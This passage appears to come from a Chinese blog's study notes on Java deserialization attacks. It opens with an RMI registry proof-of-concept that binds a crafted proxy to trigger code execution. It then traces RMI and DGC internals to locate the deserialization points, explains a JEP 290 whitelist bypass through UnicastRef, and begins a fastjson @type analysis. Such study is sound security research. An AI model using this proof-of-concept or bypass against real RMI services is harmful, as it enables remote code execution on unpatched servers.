import sun.rmi.server.UnicastRef;import sun.rmi.transport.LiveRef;import sun.rmi.transport.tcp.TCPEndpoint;import java.lang.reflect.InvocationTargetException;import java.lang.reflect.Proxy;import java.rmi.AlreadyBoundException;import java.rmi.RemoteException;import java.rmi.registry.LocateRegistry;import java.rmi.registry.Registry;import java.rmi.server.ObjID;import java.rmi.server.RemoteObjectInvocationHandler;import java.util.Random;public class ClientPoc &#123;    public static void main(String[] args) throws RemoteException, IllegalAccessException, InvocationTargetException, InstantiationException, ClassNotFoundException, NoSuchMethodException, AlreadyBoundException &#123;        Registry reg = LocateRegistry.getRegistry(&quot;127.0.0.1&quot;,1099);        ObjID id = new ObjID(new Random().nextInt()); // RMI registry        TCPEndpoint te = new TCPEndpoint(&quot;127.0.0.1&quot;, 1099);        UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));        RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);        Registry proxy = (Registry) Proxy.newProxyInstance(ClientPoc.class.getClassLoader(), new Class[] &#123;                Registry.class        &#125;, obj);        reg.bind(&quot;hello&quot;,proxy);    &#125;&#125;

最后会成功弹出计算器
同理使用unbind、rebind、lookup也是可以的，该方式在JDK&lt;&#x3D;8u231时可用，在8u241被修复
(Ps:JEP290感觉还不是很清楚，我的理解是建立一个socket连接传输数据，注册中心会直接进行反序列化，不会先进行filter)
客户端最后销毁的时候会触发dispatch，该方法会进行一个远程调用，会与注册中心有涉及，也就是说不需要调用bind等方法就可以直接对客户端进行恶意攻击（先埋个坑，以后去找一下）
]]></content>
      <categories>
        <category>java反序列化</category>
      </categories>
  </entry>
  <entry>
    <title>java反序列化之RMI专题</title>
    <url>/2024/12/26/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI%E4%B8%93%E9%A2%98/</url>
    <content><![CDATA[引用教程：RMI - Java™教程
基于Java反序列化RCE - 搞懂RMI、JRMP、JNDI
如何创建java rmi环境
JAVA安全基础（四）– RMI机制
RMI概述以下是wiki的描述：
Java远程方法调用，即Java RMI（Java Remote Method Invocation）是Java编程语言里，一种用于实现远程过程调用的应用程序编程接口。它使客户机上运行的程序可以调用远程服务器上的对象。远程方法调用特性使Java编程人员能够在网络环境中分布操作。RMI全部的宗旨就是尽可能简化远程接口对象的使用。Java RMI极大地依赖于接口。在需要创建一个远程对象的时候，程序员通过传递一个接口来隐藏底层的实现细节。客户端得到的远程对象句柄正好与本地的根代码连接，由后者负责透过网络通信。这样一来，程序员只需关心如何通过自己的接口句柄发送消息。

根据wiki所说RMI全称为Remote Method Invocation，也就是远程方法调用，通俗点解释，就是跨越jvm，调用一个远程方法。众所周知，一般情况下java方法调用指的是同一个jvm内方法的调用，而RMI与之恰恰相反。
例如我们使用浏览器对一个http协议实现的接口进行调用，这个接口调用过程我们可以称之为Interface Invocation，而RMI的概念与之非常相似，只不过RMI调用的是一个Java方法，而浏览器调用的是一个http接口。并且Java中封装了RMI的一系列定义。
RMI应用通常由两个独立的程序组成，一个服务器和一个客户端。一个典型的服务器程序创建一些远程对象，使得这些对象的引用可访问，并等待客户端调用这些对象的方法。一个典型的客户端程序在服务器上获取一个或多个远程对象的远程引用，然后调用它们的方法。RMI提供了服务器和客户端之间通信和传递信息的机制。这样的应用有时被称为分布式对象应用。
分布式对象应用需要执行以下操作：

定位远程对象。应用程序可以使用各种机制获取对远程对象的引用。例如，应用程序可以使用RMI的简单命名工具RMI注册表来注册其远程对象。另外，应用程序也可以将远程对象引用作为其他远程调用的一部分来传递和返回。
与远程对象通信。远程对象之间的通信细节由RMI处理。对于程序员来说，远程通信看起来与普通的Java方法调用类似。
加载传递的对象的类定义。因为RMI允许对象在服务器和客户端之间传递，它提供了加载对象的类定义以及传输对象数据的机制。


远程接口、对象和方法像任何其他Java应用程序一样，使用Java RMI构建的分布式应用程序由接口和类组成。接口声明方法。类实现接口中声明的方法，并且可能还声明其他方法。在分布式应用程序中，某些实现可能存在于某些Java虚拟机中，但不存在于其他虚拟机中。可以在Java虚拟机之间调用方法的对象称为远程对象。
远程对象必须通过接口来进行通信
通过实现远程接口，对象变成远程对象，具有以下特点：

远程接口扩展接口java.rmi.Remote。
接口的每个方法在其throws子句中声明java.rmi.RemoteException，除了任何特定于应用程序的异常。

简单的例子客户端和服务端的接口需要相同的包名才能序列化反序列化
具体过程可以看看B站up主白日梦组长的讲解
下面是服务端比较主要的文件代码
package org.example;import java.rmi.AlreadyBoundException;import java.rmi.RemoteException;import java.rmi.registry.LocateRegistry;import java.rmi.registry.Registry;public class RMIServer  &#123;    public static void main(String[] args) throws RemoteException, AlreadyBoundException &#123;        //实例化，接口IRemoteObj、类RemoteObjImpl都是自己写的        //远程对象必须通过接口来进行通信，所以对象remoteObj的类型是接口        IRemoteObj remoteObj = new RemoteObjImpl();        //创建一个RMI注册表，监听端口1099，这个注册表将用于将远程对象绑定到一个名字上，供客户端查找        Registry r = LocateRegistry.createRegistry(1099);        //将 remoteObj 绑定到 RMI 注册表中，并将其命名为 remoteObj。这样，客户端可以通过 remoteObj 名称来查找并访问这个远程对象        r.bind(&quot;remoteObj&quot;, remoteObj);    &#125;&#125;

客户端主代码
package org.example;import java.rmi.NotBoundException;import java.rmi.RemoteException;import java.rmi.registry.LocateRegistry;import java.rmi.registry.Registry;public class RMIClient &#123;    public static void main(String[] args) throws RemoteException, NotBoundException&#123;        //获取到指定地址 127.0.0.1 和端口 1099 上的 RMI 注册表        Registry registry = LocateRegistry.getRegistry(&quot;127.0.0.1&quot;, 1099);        //通过 lookup 方法在 RMI 注册表中查找名为 &quot;RemoteObj&quot; 的远程对象，并将返回的结果强制转换为 IRemoteObj 类型        IRemoteObj remoteObj = (IRemoteObj) registry.lookup(&quot;RemoteObj&quot;);        //调用sayHello方法        remoteObj.sayHello(&quot;hello&quot;);    &#125;&#125;

两个项目成功同时运行后，我们会在服务端处有以下的回显

回显的是大写的hello，这说明成功调用了sayHello的方法
调试RMI流程基本名词从RMI设计角度来讲，基本分为三层架构模式来实现RMI，分别为RMI服务端，RMI客户端和RMI注册中心。
客户端:
存根&#x2F;桩(Stub):远程对象在客户端上的代理;远程引用层(Remote Reference Layer):解析并执行远程引用协议;传输层(Transport):发送调用、传递远程方法参数、接收远程方法执行结果。
服务端:
骨架(Skeleton):读取客户端传递的方法参数，调用服务器方的实际对象方法， 并接收方法执行后的返回值;远程引用层(Remote Reference Layer):处理远程引用后向骨架发送远程方法调用;传输层(Transport):监听客户端的入站连接，接收并转发调用到远程引用层。
**注册表(Registry):**以URL形式注册远程对象，并向客户端回复对远程对象的引用。


分析创建部分(服务端)创建过程肯定是没有漏洞的，漏洞产生肯定是在互相调用的过程中的
所以这边就重点关注一下流程，逻辑就行
创建远程对象
开始调试，进入到RemoteObjImpl类的父类UnicastRemoteObject的构造方法中

看到传入的port值为默认值0，实际上就是会把远程对象发布到一个随机端口上
继续往下走，进入到一个重要的静态核心函数，有两个参数：第一个参数是我们的远程对象，第二个是创建了一个新的类UnicastServerRef（服务端引用）
第一个参数肯定是实现逻辑的，所以可以猜测到第二个参数是处理网络请求用的

我们跟进第二个参数看看，可以发现又创建了一个新的类LiveRef，很重要的一个类，我们跟进去

调用了一个构造函数，我们看一下，通过该构造函数我们可以获取到ip，端口等

重点看一下第二个参数，我们看一下它会返回什么东西，返回的是一个类TCPEndpoint

我们点进这个类看以下它的构造函数，也就是说只要给它一个ip，一个端口，他就可以处理后面的网络请求

LiveRef初始化完后，继续往下走，走回到了类UnicastServerRef的构造函数，引用了其父类的构造函数，作用也就是赋值而已

到这里，从始至终我们就只创建了一个liveRef类，继续往下走我们就出来了

我们继续调，这里要点的是步入，这些判断都会成功，ref的值也还是liveRef

进入sref的exportObject函数，作用是创建了代理stub，然后将stub给到注册表，客户端再从注册表拿到stub

看stub的赋值是通过函数createProxy，第一个参数是我们远程对象的类，第二个参数还是我们的ref值

接下来的步骤都是创建动态代理的过程，到下面这边的话动态代理就创建好了

下一步就是创建了一个参数target，这个可以理解为是到目前为止有用的东西的一个总封装，有兴趣的可以跟进去看一下

下一步就是把target给发布了出去，我们看一下它的逻辑，一直点步入，直到

我们点进listen()，就是来开端口的嘛，我们跟进去，这里网络请求会新开一个线程，和真正的代码逻辑的线程是不同的
再新开一个线程的时候，要是端口值为0的话就是随机赋一个值

因此到这里的时候端口就已经是有一个值的了

到目前为止，服务端就已经把远程对象发布出去了，但是发布在了一个随机端口上，所以客户端默认是不知道的
接下来服务端要做的就是记录一下，记录把它发到哪里去了，用的还是exportObject函数
重要的是圈出来的这个静态函数，我们跟进去后继续往下走

objTable.put(oe, target);以及implTable.put(weakImpl, target)的作用就是把target保存到了系统的一个静态表里面
保存好后，这就是服务端整个发布的流程
最后呢就是等待客户端的连接了

创建注册中心＋绑定
开始调试，强制步入进到了静态方法createRegistry中，该方法会创建一个RegistryImpl对象，跟进去，我们让它走到这里

if从句是安全检查，不重要，继续往下走会到else从句中创建一个LiveRef对象和UnicastServerRef对象
对象lref的端口值为1099，setup函数和上面创建远程对象过程中所调用的其实是一模一样的
这里第三个参数值为true，进该函数可以看到意思就是创建一个永久的对象，而上面仅仅是创建一个临时对象

和上面有区别的地方在于创建stub，我们进入该函数仔细看一下

会先做判断看这个stub在系统中是否已经存在，进入了if之中说明是存在的
stubClassExists(remoteClass)函数具体做判断的步骤就是检测该文件名加上后缀“_Stub”在系统中是否已经存在


然后就会调用createStub方法，该方法就是简单地创建一个stub对象
和上面的不同就是这里是直接通过forName方法创建出来的，而上面是通过动态代理创建出来的
往下走会到一个if判断，是判断是不是服务端定义好的，是的话就会调用setSkeleton方法

看上面那个流程图的话我们就会知道Skeleton是服务端的代理（客户端是stub），都是处理网络请求的
继续调试，下面的参数target也是一个集成的目前有用的东西
跟着调试到这里，调用了一个静态方法，把target给放了进去

一直跟进去并往下走，会发现把所有的数据都放到了系统的一个表里面
有三个值，一个是默认每次创建的时候都有的，一个是我们之前创建的远程服务对象，还有一个就是我们刚刚创建的注册中心（端口是固定的），两个都会创建一个stub给客户端用
客户端要是想访问服务端就需要stub，想访问注册中心的话也需要拿那个stub来访问

Ok，上述就是创建注册中心的流程
接下来就是绑定的流程，比较简单

到这一步的时候注册中心和远程对象都是已经创建完的

强制步入bind函数，首先是检查，问题不大，都会通过，然后接下来就是绑定

参数bindings其实就是一个哈希表，现在是空的
接下来就是检查表里面是否已经有remoteObj，已存在的话救护抛出已存在的异常，没有的话就put进去
这就是绑定的过程
客户端请求注册中心-客户端
首先是查找注册中心，强制步入-&gt;步入，往下调试

创建了一个类LiveRef的对象后再调用了createProxy函数，跟上面创建注册中心的步骤中是一模一样的，在自己本地上上面又起了一个stub，而不是直接拿注册中心的stub来用
然后就出来了，registry为RegistryImpl_Stub，就获取到了注册中心的stub对象

接着进进行下一步：查找远程对象
服务端绑到注册中心上的其实也是一个动态代理，这里的话其实就是获取到那个动态代理
但是这边有个问题就是我们进不到RegistryImpl_Stub.class文件中的lookup函数，这是因为该文件的java版本是1.1，而我们是1.8，所以调试不了，那就直接看吧

第一行就是创建一个连接，该函数传入一个字符串，通过var3.writeObject(var1);把它写入了一个输出流里，也就是序列化进去了
super.ref.invoke(var2);完成网络请求
ObjectInput var6 = var2.getInputStream();var23 = (Remote)var6.readObject();

之后会获取一个输入流，也就是把返回值获取到了，通过反序列化的方式读取，var23就是读回来的远程对象的代理
我们这里就可以知道客户端获取远程对象代理的过程是通过反序列化来获取的，那么要是有一个恶意的注册中心就可以通过这种方式来攻击客户端
当然除了这一种还有一个地方，就是上面提到的invoke函数
该invoke函数其实是UnicastRef.java文件中的

接着会执行executeCall()函数，在这里打一个断点

该函数有什么特别的地方呢，就是当你的异常是TransportConstants.ExceptionalReturn时，就会通过反序列化来获取流里面的对象

这里如果说你的注册中心返回一个恶意的对象，然后客户端就会在这里进行反序列化，就会导致客户端被攻击
这个点会比我们刚刚说的那个普通的反序列化更加的隐蔽，影响也更广，这是因为只要调用了invoke方法的地方都有可能会被攻击，而stub里面所有处理网络请求的都会调用这个方法
其他函数比如list()，bind等都会调用invoke方法，但是上面的那个直接反序列化并没有出现在所有的函数里面，范围更小
客户端请求服务端-客户端也就是在这一步的时候，我们跟进sayHello方法

结果是跑到这里来了，这是为什么呢
这是因为我们获取到的remoteObj是一个远程动态代理，而动态代理无论调用什么方法都会走到调用处理器里面的invoke方法

会走到return invokeRemoteMethod(proxy, method, args);，我们跟进去
走到了一个重载的invoke方法处，我们跟进去

前面一部分的逻辑还是一样的，都是创建连接，然后走到marshalValue方法，作用是序列化值
从下面我们可以知道序列化的是我们传进来的参数

序列化完后就又走到了call.executeCall();，所以嘛就是所有客户端的请求都会调用这个方法
然后往下走要是说有返回的值的话，就会调用unmarshalValue方法

而这个方法会通过反序列化来获取结果


在这个部分里面也是有两个反序列化点的，和刚才客户端请求注册中心是类似的
客户端请求注册中心-注册中心现在来看一下客户端请求注册中心的时候注册中心上面发生的事情，通过注册中心获取获取远程对象的时候注册中心是怎么处理的
从上面的那个流程图我们可以明白在客户端我们一直操作的是stub，所以服务端操作的肯定是skeleton，所以断点肯定是要下在文件RegistryImpl_Skel.class里面
具体怎么走到这个文件里面的可以来走一遍
前面自己跟着白日梦组长的视频走一下，在创建注册表的过程中最后会调用listen()函数

listen函数的作用上面部分也讲过，会开一个网络监听，在函数中会开一个新的线程，跟进去，看该线程的run方法
run方法里面也没有其他东西，所以我们继续跟进去

该方法中又创了一个线程值，所以我们要继续跟进去

走到了这里之后，我们再看看它的run方法，这个方法实际上就是调用run0方法

跟进去，重点看底下的handleMessages方法，该方法就是开始读一些字段，然后根据传过来的字段值做出不同的操作，通过switch-case方法

默认的case值如下

我们跟进serviceCall方法，它会从静态的表里面获取target，之前不是有说过服务端会把创建好的东西都放到target中，再放到静态表里面去，该方法就是这么查找target，所以断点下在这里

开头讲了这步是通过注册中心获取获取远程对象，所以要运行客户端的文件，运行完后服务端会直接跑到我们设的断点这里，说明我们前面走的都是没错的
往下调试，会获取target里面的分发器disp，disp里面有skel

下一步就是会调用disp的dispatch方法（在Transport.java文件中），我们跟进该方法中

方法中当skel不是null的时候调用oldDispatch方法，跟进去

该方法中重点就是最后会调用skel的dispatch方法，skel的值是RegistryImpl_Skel，所以就走到了我们这部分开头说的那里了
同样那个文件中的方法也是调试不了的，所以我们只能直接看

我们可以把注册中心理解为一个特殊的服务端，我们在客户端处理的一直是stub，然后走到服务端之后就是处理skeleton
文件RegistryImpl_Skel.class中的dispatch方法主要用的是switch-case逻辑，不同的case值对应的方法是不一样的，其中case2对应的是lookup方法，所以目前来说我们是会调用到case2

之前我们说过客户端代码IRemoteObj remoteObj = (IRemoteObj) registry.lookup(&quot;remoteObj&quot;);中的远程对象remoteObj是序列化传过去的，那么注册中心段case2上面的readObject函数就是反序列化读出来的
这里就是一个反序列化点，我们客户端可以通过这里反序列化攻击注册中心
当然只要其他case中有readObject函数的我们都可以进行攻击
客户端请求服务端-服务端最后客户端直接在服务端调用远程方法的时候服务端是怎么处理的呢，客户端就是于这部分代码有关系

这里的话前面跟网络相关的逻辑都是一样的
当前请求到的target是动态代理，请求到服务端了，我们再来看一下接下的逻辑

依然会走到disp的dispatch方法，我们跟进去，与前面请求注册中心不一样的是这次方法里面的num值小于0

直接走到这一步，这是因此这次的skel是空的

继续往下走获取到输入流，然后获取到方法，也就是我们定义的远程方法sayHello

继续往下走，重要的在下面

在上面有提到客户端传入的参数都是序列化传进的，然后在服务端这边就会反序列化得到
最后获取到参数值，就是我们传过来的hello

在这里进行真正的方法远程调用，然后就结束了

后面还有就是返回值，会把它给序列化，然后到客户端再反序列化

客户端请求服务端-dgcdgc是rmi的分布式垃圾回收的一个模块，不需要知道具体的，只要按照和上面的一样分析一样就要可以了
它的位置在创建静态表那里，也就是文件ObjectTable.java中，在这里打上断点

其中的dgcLog是一个静态变量，然后在调用一个类的静态变量的时候会先完成它的初始化的
初始化的时候实际上时会调用到它的静态代码块的，会走到run函数中，打个断点

开始调试，可以看到下面创建stub的方法和创建注册中心是类似的，自己可以跟一下

这边我们往下走就可以知道是创建了一个DGCImpl_Stub类，它的功能和注册中心是一样的，注册中心那个端口是用来注册服务，它这个端口是用来远程回收服务，并且这个端口是随机的

创建完了之后就把它集合到target中，然后put进去

上面就是dgc的创建过程
dgc调用的时候会走到disp里面，具体的流程和注册中心是一样的，这里就不分析了

我们重点看一下它的功能
我们首先看一下客户端DGCImpl_Stub里面的方法，有两个方法clean和dirty，其实就是一个比较干净的清除和一个比较弱的清除
我们不需要过分关注，重点看一下哪里是有风险的

dirty方法中也有这行代码super.ref.invoke(var5);，该函数函数其实是UnicastRef.java文件中的
clean方法中也有
具体可以看标题《客户端请求注册中心-客户端》
所以就是说所有的客户端stub都是可以被反序列化攻击的
dirty方法中还有一处，它是会从服务端获取到一个东西然后反序列化出来，获取到的是Lease类的东西

综上dgc客户端可是可以受到反序列化攻击的
接下来我们再来看一下服务端DGCImpl_Skel
这里有一个方法dispatch，通过switch-case来调用dirty和clean方法：case&#x3D;0调用clean，case&#x3D;1调用dirty
服务端一样看一下有没有反序列化点，如下同样是有的

所以服务端也是会被攻击的
和注册中心一样，无论是客户端还是服务端都会被攻击
但是dgc有一个特点就是它是自动生成的，也就是只要创建了远程对象就肯定有一个dgc服务
攻击远程对象的话是需要知道参数类型的，但是dgc的话就不需要
JDK高版本绕过随着版本的更新，jdk对上述我们所提到的反序列化的点都做了一些防御
8u121思路在RegistryImpl.java文件中定义了一个函数，在输入流处多加了判断

圈出来的代码是说只有你输入的类型是这几种类或者是继承了这几种类的话才允许你反序列化
在DGCImpl.java文件中限制就更加严重了

只有圈出的这几类才允许反序列化
现在的话就是这两条路都是行不通的了，之前还有说过一条路是远程对象直接反序列化
但这条路的话是需要你知道远程对象的具体参数类型才可以，下面图片中箭头所指的地方

还是有限制的,再往回看看感觉还是只能从注册中心那边下手，也就是看看RegistryImpl.java文件中有没有一些可以绕过限制的
在限制的输入类型中有一个类是UnicastRef，这个类在客户端请求注册中心的时候会走到，可以去回顾一下
这样的话客户端还是会受到反序列化的攻击
现在有一个思路，就是说让服务端发起一个客户端请求，实际上就会在服务端上面导致一个反序列化攻击
这里重点就是上面提到的RegistryImpl.java文件中的invoke方法，查找一下它的用法
调用invoke方法实际上就是在stub里面，一个是RegistryImpl_Stub，还有一个是DGCImpl_Stub
想要调用invoke方法，就必须得有一个stub，想要创建一个sub，就必须调用createProxy函数，所以我们看一下哪些地方会用到createProxy函数
直接说结论就是我们要重点关注下面这个地方的方法调用

它是在DGCClient里面的一个内部类EndpointEntry的构造函数中调用的
现在的刘晨是已经固定的，服务端代码都是已经写死的了，那么我们想改变代码的流程，实际上就是需要一个反序列化的点触发创建stub，然后再调用invoke
为什么需要反序列化呢，这是因为在一个已经跑起来的程序里面想改变它的逻辑，非常的困难，它的那种动态的特性只能通过反序列化来实现
所以现在我们就要一这里作为入口，想办法创建一个类EndpointEntry，然后生成一个dgc
下一步我们要让dgc发起一个客户端请求，要么是dirty，要么是clean
服务端上创建类EndpointEntry查找该类的用法，只有一个lookup方法

查找lookup用法

继续往上查找registerRefs用法，最终的目的是查找到一个反序列化点
这个时候有两条路

底下那个read方法是在else中调用registerRefs方法

条件是当输入流不是ConnectionInputStream的时候才会调用，但是在整个反序列化流程里面输入流都是ConnectionInputStream
所以这条路断了，只剩下上面一条

继续往上查找调用

查找releaseInputStream()方法的调用

最后就是找到了在各个Skel文件中都会调用这个方法，无论是DGCImpl_Skel或是其他的
我们Skel是在服务端的，我们在服务端上找到了一个地方能够让它产生dgc服务
就比如我们看一下注册中心的，比方说我们让它调用了一个方法list()

然后它就会调用releaseInputStream()方法，我们跟进去，其实就是相当于上面查找的流程反过来
查到下面这里，要当incomingRefTable不为空的时候才会继续往下走

只要调用了这个方法，最后就会创建一个dgc
这条链中需要我们处理的只有一个if判断，但是我们正常使用的话incomingRefTable就是空的
所以我们现在就要找不让它为空的办法，也就是找给它赋值的地方，查找incomingRefTable的用法
也就只有这一个赋值的地方，调用了一个put方法

首先的话我们需要调用saveRef方法，查找一下

上面讲过在反序列化流程中只能进入if内，所以它就会直接调用到saveRef方法
现在我们再查找一下read方法会在哪里调用

readExternalf方法实际上是java原生反序列化的另一种，就是与readObject类似但不完全一致，所以在反序列化的时候有这个方法也会调用
那到现在我们就已经完成了我们创建dgc的逻辑
我们怎么做呢
首先我们先序列化一个UnicastRef对象（因为readExternal方法在UnicastRef.java文件中），在里面保存一个ref
前面有说UnicastRef是RegistryImpl.java文件中的白名单对象，所以传过去是可以正常反序列化的
在UnicastRef里面它的反序列化是会调用上面的readExternalf方法，而这个方法又会调用read方法，read方法会调用saveRef方法，而saveRef方法会给incomingRefTable赋值，使其不为空
这一部分就结束了
总结：传入UnicastRef后，它的反序列化流程走完后内存中那个表不为空，接下来我们就正常走反序列化流程
也就是到RegistryImpl_Skel中，到它的releaseInputSream()的时候

然后我们就继续往下走到

到这里后这个表就不为空了
所以说UnicastRef的反序列化只是为了给表赋值让它走进if里面，真正的触发攻击是在正常的调用流程里面
dgc发起一个客户端请求所以现在就可以得到一个dgc对象，但是目前还没有办法发起一个请求
无碍，构造方法继续往下看会发现有提起一个新的线程

走进去，这个方法最后调用了makeDIrtyCall方法

该方法里面就自己调用了dgc的dirty方法，也就成功发送了一个客户端请求

也就是说从构造dgc到调用dirty方法都是jdk里面写好了的，但默认通过判断都是走不进去的
]]></content>
      <categories>
        <category>java反序列化</category>
      </categories>
  </entry>
  <entry>
    <title>java反序列化之fastjson</title>
    <url>/2025/02/13/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bfastjson/</url>
    <content><![CDATA[引用fastjson
FastJson&lt;&#x3D;1.2.68RCE原理详细分析
fastjson 1.2.80 漏洞浅析及利用payload
FastJson与原生反序列化
FastJson与原生反序列化(二)
高版本Fastjson：Getter调用限制及绕过方式探究
高版本Fastjson在Java原生反序列化中的利用
前言maven依赖：https://mvnrepository.com/artifact/com.alibaba/fastjson/1.2.24
&lt;dependency&gt;    &lt;groupId&gt;com.alibaba&lt;/groupId&gt;    &lt;artifactId&gt;fastjson&lt;/artifactId&gt;    &lt;version&gt;1.2.24&lt;/version&gt;&lt;/dependency&gt;

FastJSON 在序列化时，利用 Java 的反射机制，通过调用 JavaBean 的 getter 方法获取属性值。
在反序列化时，FastJSON 通过无参构造方法创建对象，并利用 setter 方法设置属性值 
基础流程分析JSONObject是一个Map类
package org.example;import com.alibaba.fastjson.JSON;import com.alibaba.fastjson.JSONObject;public class JSONUnser&#123;    public static void main(String[] args) throws Exception&#123;        String s = &quot;&#123;\&quot;param1\&quot;:\&quot;aaa\&quot;,\&quot;param2\&quot;:\&quot;bbb\&quot;&#125;&quot;;        //使用 fastjson 的 JSON.parseObject 方法将JSON字符串 s 解析为一个 JSONObject 对象        JSONObject jsonObject = JSON.parseObject(s);        System.out.println(jsonObject);        System.out.println(jsonObject.get(&quot;param1&quot;));    &#125;&#125;

通过上述代码可以初步了解到fastjson的作用
Person类
package org.example;public class Person &#123;    private int age;    private String name;    public Person()&#123;        System.out.println(&quot;Person constructor&quot;);    &#125;    public int getAge()&#123;        System.out.println(&quot;getAge&quot;);        return age;    &#125;    public void setAge(int age)&#123;        System.out.println(&quot;setAge&quot;);        this.age = age;    &#125;    public String getName()&#123;        System.out.println(&quot;getName&quot;);        return name;    &#125;    public void setName(String name)&#123;        System.out.println(&quot;setName&quot;);        this.name = name;    &#125;&#125;

测试代码
package org.example;import com.alibaba.fastjson.JSON;import com.alibaba.fastjson.JSONObject;public class JSONUnser&#123;    public static void main(String[] args) throws Exception&#123;        String s = &quot;&#123;\&quot;age\&quot; : 18, \&quot;name\&quot; : \&quot;Sherlock\&quot;&#125;&quot;;        Person person = JSON.parseObject(s, Person.class);        System.out.println(person.getName());    &#125;&#125;

上述的代码把json字符串解析为了一个java对象，然后我们还可以正常调用它的方法，在这个过程中调用了哪些方法，如下所示：

可以看到除了最后我们自己调用的getName方法外，系统会自动调用setter方法给对象进行赋值
再来一个例子：
package org.example;import com.alibaba.fastjson.JSON;import com.alibaba.fastjson.JSONObject;public class JSONUnser&#123;    public static void main(String[] args) throws Exception&#123;        //通过@type字段指定一个类，让字符串根据它来进行解析        String s = &quot;&#123;\&quot;@type\&quot; : \&quot;org.example.Person\&quot;, \&quot;age\&quot; : 18, \&quot;name\&quot; : \&quot;Sherlock\&quot;&#125;&quot;;        JSONObject jsonObject = JSON.parseObject(s);        System.out.println(jsonObject);    &#125;&#125;

运行结果如下：

从结果我们可以看出来，在这个过程中自动调用了构造方法，还有setter和getter方法来进行赋值和输出
上述代码通过我们输入的类的不同而会调用相对应的方法，这就是fastjson的一个功能
接下来我们来调试一下，探究这个过程

跟进去

我们再继续跟进parse方法中

DefaultJSONParser parser = new DefaultJSONParser(text, ParserConfig.getGlobalInstance(), features);
这段代码创建了一个 DefaultJSONParser 对象，用于解析 JSON 字符串。DefaultJSONParser 是 fastjson 库中的一个核心类，负责将 JSON 字符串解析为 Java 对象
PS：对于token的初始化可以来到defaultJSONparser的构造函数来看

往下走到Object value = parser.parse();，开始进行解析字符串，跟进去
public Object parse() &#123;        return this.parse((Object)null);    &#125;

继续跟进去，该方法会对JSON字符串中的每一个字符都进行解析，如第一次就是对&#123;进行解析

JSONObject object = new JSONObject(lexer.isEnabled(Feature.OrderedField));

没有传入lexer本身，或者是任何和我们json字符串内容相关的，断定反序列化还没进行，创建一个空的object用来后续装载生成的JSONObject对象
在下一行return代码中会调用接收Map的parseObject方法，这是最重要的地方，我们跟进去
一直往下走到这里

该处代码用来跳过任意个逗号，不重要
往下走定义了一个key变量，用于存放json中的键名
if做判断，当前是双引号，于是进行操作读取两个双引号之间的内容

获取到key之后向下走，来到了对key的判断
这里把代码块收起来方便做一个宏观的分析
如果key的值是@type，即我们当前的情况
走进第一个if代码块

展开分析可以发现有一行代码中有loadClass，跟进去看看

首先会从mappings缓存中查找class，找到了就直接返回了
没找到的话先根据className进行类特殊性检验，如[开头就意味着是数组类，则返回Array对象，如果是L开头;结尾的类数组写法，则去掉首位，再调用loadClass（forName支持对数组的类加载loadClass不支持）
之后就是简单的调AppClassLoader在本地加载类，加入缓存，返回

继续往下跟，来到这个地方，
出现了我们一开始传入的空的object，
实际上每一轮循环加载完一对key和value就会往object内存入
第一轮尚未结束，没存入任何的东西所以这里还是暂时跳过

下方来到最关键的一部分
是真正开始fastjson反序列化流程的一部分
从config中获取一个反序列化器，紧接着通过这个反序列化器进行反序列化

我们跟进去看反序列化器是怎么获取到的

先从缓存表中获取derializer
ps：在ParseConfig的构造函数中将许多内置类put进了缓存中，但是显然我们这个Person类是不在的

我们继续往下走，走到下面这步时跟进去

往下走，来到一处代码块，若在被序列化的类上面使用了@JSONType注解，则会走进这里面的获取反序列化器的逻辑进行操作
等于说是用户自定义了一个反序列化器

继续往下走到一处黑名单，仅仅是禁了一个Thread类而已

继续往下走
之后便是一堆的判断，判断类是否为某个包下的然后对应进行处理

一路skip过去，来到了创建JavaBeanDeserializer，顾名思义，应该是生成一个JavaBean的反序列化解析器

我们跟进去，开头定义了asmEnable的值默认为true

继续往下看，几种情况下asmEnable会变为false
父类标识符为非public

泛型类型参数不为0
（如UserImpl&lt;T,U&gt;的返回结果就是2，UserImpl&lt;T&gt;的返回结果就是1）

class是否使用ExtClassLoader类加载器

这里稍微进isExternal分析一下
while循环一轮过后，current为ASMClassLoader的父类加载器，即AppClassLoader
假如说这里的clazz的类加载器classLoader是ExtClassLoader，为拓展库的类，则会返回true
但是UserImpl显然是应用程序的类，其类加载器也应为AppClassLoader

出来后继续往下走，发现还有一部分的能让asmClassLoader为false的地方
比较简单就不一一列举了
继续往下走，有一行JavaBeanInfo.build()方法的调用，主要就是返回bean的一些属性包括属性名，方法名，getter，setter等

我们跟进去，首先获取类的属性，public的方法，构造方法等

313行开始，将for代码块收起来，宏观上分为三部分
第一部分，遍历所有的public方法，目的是为了获取你的所有字段
第二部分，遍历所有public的属性，上面我们的Person类属性都是private的，所以相当于没有
第三部分，再次遍历所有的public方法
（实际上第一次遍历是调所有的setter，第二次遍历是调所有的getter）

ok，我们先进入第一个for循环中
先进行判断：方法名长度是否大于4，是否是静态方法以及返回值是否为Void或者Person类本身

最开始是getName，不满则条件，跳过
直到setName方法时，进入if从句
往下走规定方法要以set开头才能进入if从句中

继续往下走，将setter对应的property全部字符转小写，Name变为name

往后一直走，通过setter操作遍历完field过后，将结果保存到fieldList

跟进FieldInfo，库库步过，直到下面这个比较重要的变量getOnly

这里先不赘述了，先埋一个伏笔
add方法就是将结果放到fieldList中
setter都遍历完之后，开始遍历所有的public字段
对field的遍历过程比较简单，不做详细描述了
往下到getter的遍历，前面的if判断和setter遍历是相似的，直到这一部分if判断代码
&amp;&amp; (Collection.class.isAssignableFrom(method.getReturnType()) || Map.class.isAssignableFrom(method.getReturnType()) || AtomicBoolean.class == method.getReturnType() || AtomicInteger.class == method.getReturnType() || AtomicLong.class == method.getReturnType())

只有当getter的返回值满足这个if中的Collection、Map等，才能进入到代码中走到最后的add
也就是说才能被当做一个property被加入到fieldList中
同时还需要满足fieldList中不包含这个字段，也就是说要是前面setter方法将某个字段加入了fieldList中后，就不会再通过getter方法加入了

在这里我们肯定都是不满足的，所以都会跳过，走到最后一行return的代码处，将前面遍历的字段还有方法之类的封装起来

走出来后，能在beanInfo中看到刚刚封装好的字段

在下面一部分代码中还有好几种方法可以使得asmEnable的值为false

上面多次提到asmEnble这个开关，那么它的作用究竟是什么呢
往下走之后，紧接着就走到一个if判断
如果asmEnable是默认的true的话，那么不会走到new JavaBeanDeserializer，而是会返回一个asmFactory的创建反序列化器的方法

